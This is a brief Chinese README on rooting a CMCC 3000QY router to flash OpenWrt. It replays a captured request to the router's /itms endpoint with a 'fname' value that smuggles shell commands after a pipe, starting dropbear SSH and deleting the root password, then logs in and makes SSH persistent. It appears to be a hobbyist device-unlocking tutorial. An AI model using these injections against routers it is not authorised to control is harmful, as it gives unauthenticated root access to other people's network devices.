# CMCC-3000QY-FLASH-OPENWRT
便宜买的刷openwrt

直接用Bp抓日志http://192.168.8.1/itms

重发"fname":"websys.log|/usr/sbin/dropbear -p 22"#开启22端口

重发"fname":"websys.log|passwd root -d"#删除密码（没必要反弹shell了）

ssh -o HostKeyAlgorithms=+ssh-rsa root@192.168.8.1 #免除ssh验证密码就是

vi /etc/config/dropbear #这里修改端口

/etc/init.d/dropbear enable #开机自启22
